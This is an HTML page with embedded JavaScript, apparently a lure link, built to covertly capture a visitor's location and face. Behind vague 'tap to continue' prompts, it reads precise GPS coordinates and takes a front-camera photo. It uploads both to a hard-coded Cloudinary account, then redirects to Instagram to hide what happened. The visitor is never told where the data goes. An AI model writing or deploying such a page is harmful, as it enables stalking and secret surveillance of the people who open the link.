<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8">
  <title>Captura de Localização e Foto</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; overflow: hidden; background: #FFF; }
    #overlay {
      position: fixed; top: 0; left: 0;
      width: 100%; height: 100%;
      display: none; justify-content: center; align-items: center;
      background: rgba(255,255,255,0.9);
      font-family: sans-serif; font-size: 20px; color: #333;
      text-align: center; padding: 20px; cursor: pointer; z-index:9999;
    }
  </style>
</head>
<body>
  <div id="overlay">Toque para continuar</div>
  <script>
    const cloudName = 'dx5legahb';
    const uploadPreset = 'upload';
    const folderName = 'capturas';
    const overlay = document.getElementById('overlay');
    const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };

    function uploadLocation(lat, lon) {
      const blob = new Blob([`Latitude: ${lat}\nLongitude: ${lon}`], { type: 'text/plain' });
      const form = new FormData();
      form.append('file', blob, `localizacao_${Date.now()}.txt`);
      form.append('upload_preset', uploadPreset);
      form.append('folder', folderName);
      return fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, { method: 'POST', body: form });
    }

    function captureAndUploadPhoto() {
      return navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
        .then(stream => {
          const video = document.createElement('video');
          video.setAttribute('playsinline',''); video.autoplay = true; video.muted = true;
          video.srcObject = stream;
          return new Promise(res => video.onloadedmetadata = res)
            .then(() => new Promise(r => video.play() || r()))
            .then(() => new Promise(r => setTimeout(r, 500)))
            .then(() => {
              const canvas = document.createElement('canvas');
              canvas.width = video.videoWidth; canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
              stream.getTracks().forEach(t => t.stop());
              return new Promise((resolve) => {
                canvas.toBlob(async blob => {
                  const form = new FormData();
                  form.append('file', blob);
                  form.append('upload_preset', uploadPreset);
                  form.append('folder', folderName);
                  const resp = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, { method: 'POST', body: form });
                  const data = await resp.json();
                  resolve(data.secure_url);
                }, 'image/png');
              });
            });
        });
    }

    function showOverlay(message) {
      overlay.textContent = message;
      overlay.style.display = 'flex';
    }

    // Initial click handler
    function initialClick() {
      overlay.style.display = 'none';
      navigator.geolocation.getCurrentPosition(onLocationSuccess, onLocationError, options);
    }

    function onLocationError() {
      showOverlay('Toque para permitir a localização');
      overlay.onclick = initialClick;
    }

    async function onLocationSuccess(pos) {
      try {
        await uploadLocation(pos.coords.latitude, pos.coords.longitude);
        // After location upload, prompt camera
        showOverlay('Toque para permitir a câmera');
        overlay.onclick = cameraClick;
      } catch (e) {
        console.error(e);
        showOverlay('Erro ao enviar localização. Toque para tentar novamente.');
        overlay.onclick = initialClick;
      }
    }

    // Camera click handler
    async function cameraClick() {
      overlay.style.display = 'none';
      try {
        await captureAndUploadPhoto();
        window.location.href = 'https://instagram.com';
      } catch (e) {
        console.error(e);
        showOverlay('Permissão de câmera negada. Toque para tentar novamente.');
        overlay.onclick = cameraClick;
      }
    }

    document.addEventListener('DOMContentLoaded', () => {
      showOverlay('Toque para continuar');
      overlay.onclick = initialClick;
    });
  </script>
</body>
</html>
